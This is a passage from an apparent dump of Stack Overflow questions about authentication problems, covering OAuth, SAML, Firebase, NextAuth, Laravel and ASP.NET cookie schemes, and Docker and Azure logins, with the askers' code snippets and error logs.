    var_dump($store_url, $consumer_key, $consumer_secret, $callback_url, $return_url);
 
    // Constrói a URL de autorização
    // Redireciona o usuário para a URL de autorização
    header(&quot;Location: $authorization_url&quot;);
    exit;
} else {
    // Se o formulário não foi enviado, redirecione para a página do formulário
    header(&quot;Location:gesfaturacao/WooCommerce/index.php&quot;);
    exit;
}
 
?&gt;
</code></pre>
"
"<p>My developer facebook app got deactivated 1 month ago because I missed the deadline of annual Data Protection Assessment. Then, I spent 2 days to complete this accessment and Facebook already informed me that my answers were reviewed and completed.
<a href=""https://i.stack.imgur.com/tSOJt.png"" rel=""nofollow noreferrer"">Data Protection Assessment complete notification</a></p>
<p><a href=""https://i.stack.imgur.com/BMOl3.png"" rel=""nofollow noreferrer"">Data Protection Assessment Status Image</a>
But when I tried to use Facebook login feature, I still got the error message:
<a href=""https://i.stack.imgur.com/JD4Be.png"" rel=""nofollow noreferrer"">Facebook Login Error</a></p>
<p>Is there anyone know why I got this problem?</p>
<p>Thanks.</p>
<p>I already completed the Data Protection Assessment and it is successful.</p>
"
"<p>We already have a running Blazor WebAssembly App (ASP.NET Core hosted) and implemented Authentication/Authorization according to <a href=""https://codewithmukesh.com/blog/authentication-in-blazor-webassembly/"" rel=""nofollow noreferrer"">this tutorial</a>. We added Roles to the project in order to restrict users to certain content.
The backend is using <em>Microsoft.AspNetCore.Identity</em> as NuGet dependency.<br/>
We want to implement a .NET MAUI App for this project, which should use the same database for the users, so no one has to register again.<br/>We still want to use the same backend for our Blazor application, therefore the solution must be compatible with both Blazor and .NET MAUI. <br/>Is there a way for .NET MAUI to use the same Users/Roles which were created with <em>Microsoft.AspNetCore.Identity</em>? If possible, how do we render UI elements based on the role of the user?</p>
"
"<p>I am trying to add multiple attribute values to a customer SAML attribute for users in a group with OneLogin.</p>
<p>Currently, I can use a custom macro to check for whether a user is in a group and then set a custom attribute value.</p>
<p>My attribute value name is <code>http://schemas.xmlsoap.org/claims/Group</code> and I can set its value to my desired value giving me a SAML response attribute like this</p>
<pre><code>&lt;saml:Attribute Name=&quot;http://schemas.xmlsoap.org/claims/Group&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot; &gt;
  &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;example-owner&lt;/saml:AttributeValue&gt;
&lt;/saml:Attribute&gt;
</code></pre>
<p>However, when I have multiple macro rules, the attribute keeps getting overridden when a user is a member of multiple groups (e.g. owner, member, guest). I want to be able to set multiple attribute values inside the attribute like this:</p>
<pre><code>&lt;saml:Attribute Name=&quot;http://schemas.xmlsoap.org/claims/Group&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:uri&quot;&gt;
  &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;example-owner&lt;/saml:AttributeValue&gt;
  &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;example-member&lt;/saml:AttributeValue&gt;
  &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;example-guest&lt;/saml:AttributeValue&gt;
&lt;/saml:Attribute&gt;
</code></pre>
<p>How can I achieve this in a Onelogin macro?</p>
"
"<p>When using the Azure CLI task within an Azure DevOps pipeline to run a powershell script as per the below:</p>
<pre><code>$resourceGroupName = &quot;rgname&quot;
$serverName = &quot;sqldbname&quot;

$databases = Get-AzSqlDatabase -ResourceGroupName $resourceGroupName -ServerName $serverName

foreach ($database in $databases) {
    Write-Host &quot;Deleting database $($database.DatabaseName)...&quot;
    Remove-AzSqlDatabase -ResourceGroupName $resourceGroupName -ServerName $serverName -DatabaseName $database.DatabaseName -Force
}
</code></pre>
<p>I'm seeing the below error thrown on the Get-AzSqlDatabase command:</p>
<blockquote>
<p>Your Azure credentials have not been set up or have expired, please run Connect-AzAccount to set
up your Azure credentials. No certificate thumbprint or secret provided for the given service principal '***'.</p>
</blockquote>
<p>I've also seen the same with the managed instance equivalent command 'Get-AzSqlInstanceDatabase'</p>
<p>What is the best way to authenticate these types of requests that does not require interaction? (given that it is being run within a pipeline as part of an automated process).</p>
<p>As an FYI the pipelines are being run on a self-hosted windows agent and the scripts within the job have been given access to the OAuth token.</p>
"
"<p>I'm getting started with docker so have created my account on docker hub with my gmail account, have creaeted even a repo there. Now I want to push my repo like:
<code>docker push user_name/my_image:latest</code>
I get the error:</p>
<pre><code>9733ccc39513: Preparing
denied: requested access to the resource is denied
</code></pre>
<p>when searching, I found that I have to login to my account through the terminal. my problem is I have create my account with gmail, so when I tried this found command:
<code>docker login --email myEmail@gmail.com</code>
I'm get back this error:
'unknown flag: --email'</p>
<p>Can you please advise something better to push a repo on docker hub?</p>
<p><code>docker login --email myEmail@gmail.com</code>
I'm get back this error:
'unknown flag: --email'</p>
"
"<p>I'm developing a MERN stack application with a React frontend hosted on Surge (<code>https://thestudyapp.surge.sh</code>) and an Express backend hosted on Render (<code>https://study-app-server.onrender.com</code>). I've implemented Google OAuth for authentication using Passport.js. The OAuth flow appears to work correctly—I can log in and see the user's details logged on the backend, indicating that serialization and Google OAuth authentication work as expected. However, when I attempt to access protected routes after authentication, specifically <code>/current-user</code>, I receive a <code>401 Unauthorized</code> error, suggesting that the session is not persisting across requests or the user is not recognized as authenticated for subsequent requests.</p>
<h3>Environment:</h3>
<ul>
<li><strong>Frontend</strong>: React app hosted on Surge</li>
<li><strong>Backend</strong>: Express server hosted on Render</li>
<li><strong>Authentication</strong>: Google OAuth with Passport.js</li>
</ul>
<h3>Issue Details:</h3>
<p>After a successful Google OAuth login, the user's details are logged on the backend, and the user is serialized correctly. However, when accessing the <code>/current-user</code> route to fetch the current user's details, the request fails with a <code>401 Unauthorized</code> status. Despite the apparent success of the authentication process (as indicated by the backend logs), the session does not seem to persist or the user is not recognized as authenticated on subsequent requests.</p>
<h3>Backend Configuration Snippets:</h3>
<p><strong>Session Configuration in Express:</strong></p>
<pre class=""lang-js prettyprint-override""><code>app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ mongoUrl: process.env.MONGO_URI }),
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: &quot;none&quot;
  },
}));
</code></pre>
<p><strong>CORS Configuration:</strong></p>
<pre class=""lang-js prettyprint-override""><code>app.use(
  cors({
    origin: &quot;https://thestudyapp.surge.sh&quot;,
    credentials: true, // Allow sending cookies from the frontend
  })
);
</code></pre>
<p><strong>Passport Initialization:</strong></p>
<pre class=""lang-js prettyprint-override""><code>app.use(passport.initialize());
app.use(passport.session());
</code></pre>
<p><strong>Passport Google OAuth Strategy Configuration:</strong></p>
<pre class=""lang-js prettyprint-override""><code>passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: `${process.env.BACKEND_BASE_URL}/auth/google/callback`
}, async (accessToken, refreshToken, profile, done) =&gt; {
      const client = await connectDB();
      console.log(&quot;Google profile ID:&quot;, profile.id);

      let user = await client
        .db()
        .collection&lt;Account&gt;(&quot;accounts&quot;)
        .findOne({ googleId: profile.id });

      if (!user) {
        // If the user does not exist, create a new user.
        const response = await client
          .db()
          .collection&lt;Account&gt;(&quot;accounts&quot;)
          .insertOne({ googleId: profile.id });

        // Fetch the newly created user
        user = await client
          .db()
          .collection&lt;Account&gt;(&quot;accounts&quot;)
          .findOne({ _id: response.insertedId });
      }
      console.log(&quot;User:&quot;, user);
      done(null, user || undefined);
    }));
</code></pre>
<p><strong>Route for <code>/current-user</code>:</strong></p>
<pre class=""lang-js prettyprint-override""><code>accountRouter.get(&quot;/current-user&quot;, (req, res) =&gt; {
  if (req.isAuthenticated()) {
    res.json(req.user);
  } else {
    res.status(401).json({ message: &quot;User not authenticated&quot; });
  }
});
</code></pre>
<h3>Attempts to Resolve:</h3>
<ul>
<li>Verified that <code>withCredentials: true</code> is set for all Axios requests from the frontend.</li>
<li>Confirmed CORS configuration on the backend to include credentials and the correct origin.</li>
</ul>
<p>Despite these checks, the <code>/current-user</code> route consistently returns a <code>401 Unauthorized</code> error after a successful login. It seems like the session is not being maintained between the OAuth flow and subsequent requests.</p>
<h3>Questions:</h3>
<ol>
<li>Are there known issues with session persistence for Express applications hosted on Render when using Google OAuth and Passport.js?</li>
<li>Could the issue be related to the specific configuration of cookies or the session store with <code>connect-mongo</code>?</li>
<li>Is there a step I'm missing in ensuring that the authentication state persists across requests in a React/Express application setup?</li>
</ol>
<p>Any insights or suggestions to debug this issue further would be greatly appreciated.</p>
<hr />
"
"<p>so this is the code:</p>
<pre class=""lang-dart prettyprint-override""><code>@override
Future&lt;Either&lt;Failure, UserModel&gt;&gt; signInWithEmailAndPassword(
  String email,
  String password,
) async {
  try {
    final UserCredential userCredential =
        await _auth.signInWithEmailAndPassword(
      email: email,
      password: password,
    );
    final user = userCredential.user;
    if (user != null) {
      final snapshot =
          await _fireStore.collection(_userCollection).doc(user.uid).get();
      print(&quot;THIS IS THE SNAPSHOT DATA $snapshot.data() &quot;);

      if (snapshot.exists) {
        final usermodel =
            UserModel.fromJson(snapshot.data() as Map&lt;String, dynamic&gt;);
        print(&quot;THIS IS THE USERMODEL $UserModel &quot;);
        return Right&lt;Failure, UserModel&gt;(usermodel);
      } else {
        return Left&lt;Failure, UserModel&gt;(
          Failure(message: &quot;No userdata has been found&quot;),
        );
      }
    } else {
      return Left&lt;Failure, UserModel&gt;(
        Failure(message: &quot;User not found&quot;),
      );
    }
  } on FirebaseAuthException catch (exception) {
    print(&quot;THIS IS THE EXEPTIONcodes: $exception&quot;);
    print(&quot;THIS IS THE EXEPTIONmessages: $exception&quot;);
    return Left&lt;Failure, UserModel&gt;(
      Failure(
        exceptionCode: exception.code,
        message: exception.message,
      ),
    );
  } catch (exception) {
    print(&quot;THIS IS THE  NORMAL EXEPTIONcodes: $exception&quot;);
    print(&quot;THIS IS THE NORMAL  EXEPTIONmessages: $exception&quot;);
    return Left&lt;Failure, UserModel&gt;(
      Failure(
        message: exception.toString(),
      ),
    );
  }
}
</code></pre>
<p>and this is where the code is being called in the ui and placed in a button:</p>
<pre class=""lang-dart prettyprint-override""><code>void signInWithEmailAndPassword() async {
  setState(
    () {
      formStatus = FormStatus.submissionInProgress;
    },
  );
  final result = await SignInWithEmailAndPasswordUseCase(
    repository: UserRepositoyImplementation(
      userDataSource: UserRemoteDataSourceImplementation(),
    ),
  ).call(
    _emailController.text,
    _passwordController.text,
  );
  result.fold(
    (failure) {
      final exceptionCode = failure.exceptionCode;
      if (exceptionCode == &quot;user-not-found&quot;) {
        setState(
          () {
            formStatus = FormStatus.submissionFailure;
          },
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(local(context).userNotFound),
          ),
        );
      } else if (exceptionCode == &quot;invalid-email&quot;) {
        setState(
          () {
            formStatus = FormStatus.submissionFailureInvalidCredentials;
          },
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(local(context).invalidEmail),
          ),
        );
      } else if (exceptionCode == &quot;wrong-password&quot;) {
        setState(
          () {
            passwordStatus = PasswordStatus.invalid;
          },
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(local(context).wrongPassword),
          ),
        );
      } else if (exceptionCode == &quot;user-disabled&quot;) {
        setState(
          () {
            formStatus = FormStatus.submissionFailureUserDisabled;
          },
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(local(context).userDisabled),
          ),
        );
      } else {
        setState(
          () {
            formStatus = FormStatus.submissionFailure;
          },
        );
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(local(context).anErrorOccured),
          ),
        );
      }
    },
    (user) {
      setState(
        () {
          formStatus = FormStatus.submissionSuccess;
        },
      );
      _userProvider.setUser(user);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(local(context).userloggedInSuccessfully),
        ),
      );
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (context) =&gt; const HomePage(),
        ),
      );
    },
  );
}
</code></pre>
<p>and this is the button:</p>
<pre class=""lang-dart prettyprint-override""><code>ElevatedButtonWidget(
  text: local(context).signIn,
  onPressed: signInWithEmailAndPassword,
),
</code></pre>
<p>and this is the error am getting</p>
<pre class=""lang-none prettyprint-override""><code>Logging in as warukelvin54@gmail.com with empty reCAPTCHA token.
Ignoring header X-Firebase-Locale because its value was null.
Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: Error returned from API. code: 403 body: App attestation failed.
</code></pre>
<p>Tried asking chatpgt..and also i tried to to add appcheck to firestore and implement it in my code to eleminate the appcheck issue:
so what as</p>
"
"<p><strong>I am building an app where security is really important.</strong>
For the user authentication, I currently use the basic email/password auth with Firebase.
Firebase is as well used as my database.</p>
<p><strong>I would like to enhance the security of my authentication flow, adding a deviceID factor in addition to the email/password factors.</strong></p>
<p>Here is the flow idea:</p>
<ul>
<li>I generate a deviceID (store in secure storage) when a user create an account for its current device.</li>
<li>When the user will login later, it will check if its current deviceID (if existing in secure storage) is saved as a trusted device in the database</li>
<li>If not trusted, an OTP challenge will be triggered. If succeed, the current device will be added to the list of trusted devices</li>
</ul>
<p>Some people does that locally, but it is not secure (Firebase auth API is still available with only email/password in bypassing the app UI).</p>
<p>**I am looking for a solution to integrate the deviceID factor to an authentication flow.
**</p>
<p>Research I have done:</p>
<ul>
<li>Firebase blocking functions: unfortunately we cannot pass custom parameter, and the native values of the event parameters (IP address, userAgent...) are not enough robust/secure</li>
<li>Firebase cloud functions: not directly correlated to the authentication flow, so the Firebase auth API will remain available with only email/password in bypassing the app UI)</li>
<li>Supabase: does not propose custom authentication, and the serverless function got the same issue as the Firebase cloud functions</li>
<li>Local custom actions: same issue as cloud functions</li>
</ul>
<p><strong>Promising trails:</strong></p>
<p>The Firebase custom Token allow to connect a user and use the Firebase services, which is great given the Firebase integration is nice on Flutter.</p>
<p>It involves either:</p>
<ul>
<li>to create my own auth backend, which could cause security flaws (given I am not an expert) and as well adding more code to manage</li>
<li>or to use an external auth provider (Clerk, Auth0, Amazon Cognito...)</li>
</ul>
<p><strong>Has someone already solve this can of issue for its app ?
Has some already integrated Clerk, Auth0 or Cognito as custom authentication provider in its FlutterFlow app?</strong></p>
<p>Thanks in advance for replies</p>
"
"<p>I've created a webapp (in React) and I'd like to create a chrome extension that overlays a specific page of the webapp on every page I visit. My thought was to just build the page in my webapp and then use an iframe in the chrome extension to render that page. However, the page makes http requests to a server and uses an http only cookie for authentication. This doesn't seem to work with my iframe. Essentially I want a user that's logged in on my website be able to make authenticated http requests originating from the extension.</p>
<p>Is there a way to make this work? Or is this the wrong approach entirely and how should it be done? Thanks</p>
"
"<p>I am learning laravel and to practice I am carrying out a project that I used a few months ago that I made with PHP without any framework, so I am transferring it little by little. I have encountered some problems and one of them is that I can't add an authentication middleware to be able to access to the dashboard.  I had tried doing something like this</p>
<pre><code>// Route::get('/dashboard', function() {
// return view('login/dashboard');
// });
</code></pre>
<p>And so I was able to login if the username and password match, but I can login through the URL by adding /dashboard to the end, for that reason I need the middleware but I can't get it to work. If anyone can help me I would be glad. Thanks.</p>
<p>By the way, I have been checking the logic and within:</p>
<pre><code>    if ($user &amp;&amp; $user-&gt;username !== null &amp;&amp; Hash::check($credentials['username'], $username-    &gt;username)) {
            //return redirect()-&gt;intended('/dashboard');
            return 'test';
        }
</code></pre>
<p>Which would be when my username and password match then if it displays the message.</p>
<p>This is my Authenticate.php:</p>
<pre><code>&lt;?php

namespace App\Http\Middleware;

use Illuminate\Auth\Middleware\Authenticate as Middleware;
use Illuminate\Http\Request;

class Authenticate extends Middleware
{
    /**
     * Get the path the user should be redirected to when they are not authenticated.
     */
    protected function redirectTo(Request $request): ?string
    {
        return $request-&gt;expectsJson() ? null : route('login');
    }
}

</code></pre>
<p>This is my web.php (routes/web.php)</p>
<pre><code>&lt;?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;

Auth::routes();

Route::get('/', [AuthController::class, 'showLoginForm'])-&gt;name('login');


Route::post('/', [AuthController::class, 'loginValidator'])-&gt;name('login.validator');

Route::middleware('auth')-&gt;group(function () {
    Route::get('/dashboard', function() {
        return view('dashboard.index');
    })-&gt;name('dashboard');
});


</code></pre>
<p>This is my model Usuario.php:</p>
<pre><code>&lt;?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Usuario extends Model
{
    use HasFactory;

    protected $table = 'usuarios';

    protected $primaryKey = 'idUsuario';

    protected $fillable = [
        'nombreUsuario', 'contrasenaUsuario', 'sucursal', 'tipoUsuario'
    ];

}

</code></pre>
<p>This is my AuthController.php:</p>
<pre><code>&lt;?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Usuario;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;



class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('login.index');
    }

    public function loginValidator(Request $request)
    {
        $credentials = $request-&gt;only('nombreUsuario', 'contrasenaUsuario');
        $usuario = Usuario::where('nombreUsuario', $credentials['nombreUsuario'])
        -&gt;where('contrasenaUsuario', '!=', null) 
        -&gt;first();

        if ($usuario &amp;&amp; $usuario-&gt;contrasenaUsuario !== null &amp;&amp; Hash::check($credentials['contrasenaUsuario'], $usuario-&gt;contrasenaUsuario)) {
            return redirect()-&gt;intended('/dashboard');
        }
        
        return redirect('/')-&gt;withErrors(['nombreUsuario' =&gt; 'Credenciales incorrectas']);
    }
}
</code></pre>
<p>And this is my auth.php with the name of the table as &quot;usuarios&quot;:</p>
<pre><code>&lt;?php

return [



    'defaults' =&gt; [
        'guard' =&gt; 'web',
        'passwords' =&gt; 'users',
    ],



    'guards' =&gt; [
        'web' =&gt; [
            'driver' =&gt; 'session',
            'provider' =&gt; 'usuarios',
        ],
    ],



    'providers' =&gt; [
        'usuarios' =&gt; [
            'driver' =&gt; 'eloquent',
            'model' =&gt; App\Models\Usuario::class,
        ],


    ],



    'passwords' =&gt; [
        'users' =&gt; [
            'provider' =&gt; 'users',
            'table' =&gt; 'password_reset_tokens',
            'expire' =&gt; 60,
            'throttle' =&gt; 60,
        ],
    ],



    'password_timeout' =&gt; 10800,

];

</code></pre>
"
"<p>I'am currently creating a new next14 project using prisma.</p>
<p>I have this code  to manage nextAuth:</p>
<pre><code>import { NextAuthOptions } from 'next-auth';
import GitHubProvider from 'next-auth/providers/github';
import { PrismaAdapter } from '@next-auth/prisma-adapter';
import NextAuth from 'next-auth/next';
import { PrismaClient } from '@prisma/client';

const githubId = process.env.AUTH_GITHUB_ID;
const githubSecret = process.env.AUTH_GITHUB_SECRET;

if (!githubId || !githubSecret) {
  throw new Error('no githubid or secret');
}

const prisma = new PrismaClient();

export const authOptions: NextAuthOptions = {
  adapter: PrismaAdapter(prisma),
  providers: [
    GitHubProvider({
      clientId: githubId,
      clientSecret: githubSecret,
    }),
  ],
  callbacks: {
    session({ session, user }) {
      session.user.name = user.name;
      session.user.image = user.image;
      session.user.id = user.id;

      return session;
    },
  },
};

export default NextAuth(authOptions);
    
</code></pre>
<p>And session alway can be undefined and Id doesnt existe on session.user.id</p>
<p>I have this package</p>
<pre><code>&quot;@auth/prisma-adapter&quot;: &quot;^1.0.11&quot;,
    &quot;@prisma/client&quot;: &quot;^5.10.2&quot;,
</code></pre>
<p>I alson have another on folder to get my session easyli durring the project and session also can be undefined (I had the same file for another project and it worked :</p>
<pre><code>import {
  GetServerSidePropsContext,
  NextApiRequest,
  NextApiResponse,
} from 'next';
import { getServerSession } from 'next-auth';
import { authOptions } from '../../pages/api/auth/[...nextauth]';

type ParametersGetServerSession =
  | []
  | [GetServerSidePropsContext['req'], GetServerSidePropsContext['res']]
  | [NextApiRequest, NextApiResponse];

export const getAuthSession = async (
  ...parameters: ParametersGetServerSession
) =&gt; {
  const session = await getServerSession(...parameters, authOptions);
  return session;
};
export const getRequiredAuthSession = async (
  ...parameters: ParametersGetServerSession
) =&gt; {
  const session = await getServerSession(...parameters, authOptions);
  if (!session?.user.id) {
    throw new Error('Unhautorized');
  }
  return session as {
    user: {
      id: string;
      email?: string;
      image?: string;
      name?: string;
    };
  };
};

If I do await getServerSession(authOptions) I can get my user informations AND id after connecting.
  
</code></pre>
<p>I already did almost the same thing for another one project with :</p>
<pre><code>import { AuthOptions } from 'next-auth';
import { PrismaAdapter } from '@auth/prisma-adapter';
import prisma from '@/lib/prisma';
import NextAuth from 'next-auth/next';
import GitHubProvider from 'next-auth/providers/github';
import { env } from '@/lib/env';

const githubId = process.env.GITHUB_ID;
const githubSecret = process.env.GITHUB_SECRET;

export const authOptions: AuthOptions = {
  adapter: PrismaAdapter(prisma),

  providers: [
    GitHubProvider({
      clientId: env.GITHUB_ID,
      clientSecret: env.GITHUB_SECRET,
    }),
  ],
  callbacks: {
    session({ session, user }) {
      session.user.name = user.name;
      session.user.image = user.image;
      session.user.id = user.id;

      return session;
    },
  },
};

    export default NextAuth(authOptions); 
</code></pre>
<p>I had this package :</p>
<pre><code>  &quot;@auth/prisma-adapter&quot;: &quot;^1.0.11&quot;,
    &quot;@next-auth/prisma-adapter&quot;: &quot;^0.4.4-canary.81&quot;,
    &quot;@prisma/client&quot;: &quot;^5.7.1&quot;,
</code></pre>
<p>You can find my repos :</p>
<p>repo with error : <a href=""https://github.com/NocerGal/Dix-Cordes/blob/main/pages/api/auth/%5B...nextauth%5D.ts"" rel=""nofollow noreferrer"">https://github.com/NocerGal/Dix-Cordes/blob/main/pages/api/auth/%5B...nextauth%5D.ts</a></p>
<p>repo that works : <a href=""https://github.com/NocerGal/Blog-Next/blob/main/pages/api/auth/%5B...nextauth%5D.ts"" rel=""nofollow noreferrer"">https://github.com/NocerGal/Blog-Next/blob/main/pages/api/auth/%5B...nextauth%5D.ts</a></p>
<p>I am on this error for now one day, I don't know how to manage it. I saw people seem online having this kind on issue, but not with session.</p>
"
"<p>I am having same issue as mentioned in this question -&gt;
<a href=""https://stackoverflow.com/questions/19778139/google-app-engine-the-backend-is-locked-down"">Google App Engine: &quot;The backend is locked down&quot;</a></p>
<p>I have also set up all credentials and authenticated myself and able to login, but constantly get the message</p>
<pre><code> com.google.api.client.googleapis.json.GoogleJsonResponseException: 401 Unauthorized
POST &lt;my API url&gt;
{
  &quot;code&quot;: 401,
  &quot;errors&quot;: [
    {
      &quot;domain&quot;: &quot;global&quot;,
      &quot;message&quot;: &quot;The backend is locked down. The administrator can change the authentication/authorization settings on &lt;my site url&gt;&quot;,
      &quot;reason&quot;: &quot;required&quot;
    }
  ],
  &quot;message&quot;: &quot;The backend is locked down. The administrator can change the authentication/authorization settings on &lt;my site url&gt;&quot;
}
</code></pre>
<p>The solution in the code mentions a link <a href=""https://developers.google.com/cloud/samples/mbs/deploy_backend"" rel=""nofollow noreferrer"">https://developers.google.com/cloud/samples/mbs/deploy_backend</a> and mentions point 8, but that link does not seem to be same now in 2024.</p>
<p>How to solve this issue ?</p>
"
"<p>I'm already sending the username and password and both are correct.
Below is the Stack trace for the error :</p>
<pre><code>ERROR: Exception occured!: com.sun.xml.internal.ws.client.ClientTransportException: The server sent HTTP status code 401 : Unauthorized
at com.sun.xml.internal.ws.transport.http.client.HttpTransportPipe.CheckStatusCode (HttpTransportPipe-java:310)
at com.sun.xml.internal.ws.transport.http.client.HttpTransportPipe.createResponsePacket (HttpTransportPipe.java:259)
at com.sun.xml.internal.ws.transport.http.client.HttpTransportPipe.process (HttpTransportPipe.java: 217)
at com.sun.xml.internal.ws.transport.http.client.HttpTransportPipe.processRequest (HttpTransportPipe.java:130)
at com. sun.xml.internal.ws.transport.DeferredTransportPipe.processRequest (DeferredTransportPipe-java: 95)
at com.sun.xml.internal.ws.api.pipe.Fiber.__doRun (Fiber-java: 1121)
at com. sun. xml. internal.ws.api pipe. Fiber.__doRun (Fiber. java: 1035)
at com.sun.xml.internal.ws.api.pipe.Fiber.doRun (Fiber.java:1004)
at com. sun. xml. internal.ws.api.pipe. Fiber.runSync (Fiber.java: 862)
at com. sun. xml. internal.ws. client. Stub.process (Stub.java: 448)
at com.sun.xml.internal.ws.client.sei.SEIStub. doProcess (SEIStub.java: 178)
at com.sun.xml.internal.ws.client.sei.SyncMethodHandler.invoke (SyncMethodHandler.java: 93)
at com.sun.xml.internal.ws.client.sei.SyncMethodHandler.invoke (SyncMethodHandler.java: 77)
at com. sun.xml.internal.ws.client. sei.SEIStub. invoke (SEIStub. java: 147)
at com. sun.proxy.$Proxy2050.getGDPRinsightReplyData (Unknown Source)
</code></pre>
"
"<p>I have two schemes as follows:</p>
<pre><code>    builder.Services.AddAuthentication(option =&gt;
{
    option.DefaultSignInScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    option.DefaultAuthenticateScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    option.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;
}).AddCookie(option =&gt; // Admins' Scheme
{
    option.LoginPath = new PathString(&quot;/admin/auth/login&quot;);
    option.ExpireTimeSpan = TimeSpan.FromMinutes(1);
    option.AccessDeniedPath = new PathString(&quot;/&quot;);
}).AddCookie(&quot;user&quot;, option =&gt; // Users' Scheme
{
    option.LoginPath = new PathString(&quot;/&quot;);
    option.ExpireTimeSpan = TimeSpan.FromMinutes(1);
    option.AccessDeniedPath = new PathString(&quot;/&quot;);
});
</code></pre>
<p>There are two ways to access the login functionality for users: admin and ordinary users.</p>
<p>For admins:</p>
<pre><code>[HttpPost]
    public IActionResult Login(RequestAuthLoginUsersServiceDto req)
    {
        var login = _userFacade.AuthLoginUsersService.Execute(req);
        if (login != null)
        {
            if (login.IsSuccess)
            {
                var claims = new List&lt;Claim&gt;() {
                    new Claim(ClaimTypes.NameIdentifier,login.Data.IdUser.ToString()),
                    new Claim(ClaimTypes.Email,req.Email),
                    new Claim(ClaimTypes.Name,login.Data.Nickname),
                    new Claim(ClaimTypes.Role,login.Data.Role),
                };

                var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var principal = new ClaimsPrincipal(identity);
                var propertise = new AuthenticationProperties()
                {
                    IsPersistent = true,
                    ExpiresUtc = DateTime.Now.AddYears(1),
                };
                _userLoginLogFacade.PostUserLoginLogService.Execute(new RequestPostUserLoginLogServiceDto
                {
                    UsersId = login.Data.IdUser,
                    IP = Request.HttpContext.Connection.RemoteIpAddress.ToString(),
                });
                HttpContext.SignInAsync(principal, propertise);
            }
        }
        return Json(login);
    }
</code></pre>
<p>user:</p>
<pre><code>[HttpPost]
    public IActionResult Login(RequestAuthLoginUsersServiceDto req)
        {
        var login = _userFacade.AuthLoginUsersService.Execute(req);
        if (login != null)
        {
            if (login.IsSuccess)
            {
                var claims = new List&lt;Claim&gt;() {
                    new Claim(ClaimTypes.NameIdentifier,login.Data.IdUser.ToString()),
                    new Claim(ClaimTypes.Email,req.Email),
                    new Claim(ClaimTypes.Name,login.Data.Nickname),
                    new Claim(ClaimTypes.Role,login.Data.Role),
                };

                // var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var identity = new ClaimsIdentity(claims, &quot;user&quot;);
                var principal = new ClaimsPrincipal(identity);
                var propertise = new AuthenticationProperties()
                {
                    IsPersistent = true,
                    ExpiresUtc = DateTime.Now.AddYears(1),
                };
                _userLoginLogFacade.PostUserLoginLogService.Execute(new RequestPostUserLoginLogServiceDto
                {
                    UsersId = login.Data.IdUser,
                    IP = Request.HttpContext.Connection.RemoteIpAddress.ToString(),
                });
                HttpContext.SignInAsync(
                    &quot;user&quot;,
                    principal,
                    propertise);
            }
        }
</code></pre>
<p>The problem is that when a user logs in, &quot;User.Identity.IsAuthenticated&quot; returns &quot;false&quot;. However, when an admin logs in, the same code returns &quot;true&quot;. It is important to note that if I use &quot;[Authorize(AuthenticationSchemes = &quot;user&quot;)]&quot;, the code returns &quot;true&quot; for the user. However, for the default mode (admin way), the &quot;[Authorize(AuthenticationSchemes = &quot;user&quot;)]&quot; is not needed.</p>
"
"<p>In the frontend, in case of get req /api/v1/users/chats it's request headers section-</p>
<pre><code>GET /api/v1/users/chats HTTP/1.1
Host: localhost:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:5173/
Origin: http://localhost:5173
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
</code></pre>
<p>and in case of post req /api/v1/prompts/create that is -</p>
<pre><code>POST /api/v1/prompts/create HTTP/1.1
Host: localhost:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------155569911418215713223055054392
Content-Length: 10637
Origin: http://localhost:5173
Connection: keep-alive
Referer: http://localhost:5173/
Cookie: token=eyJhbGciOiJIUzI1NiCI6IkpXVCJ9.eyJpZCI6IjY1YzlmNzliNjlmNGQ4OTJkZjc4OSIsImlhdCI6MTwMTk2NywiZXhwIjoxNzA5MjA2NzY3fQ.ZQHlb8eL5MfArxTwJBKxFpI764W_VipAmNN4NMkPwIQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
</code></pre>
<p>then why am i facing the problem of not getting cookie part in the req header of /chats endpoint?
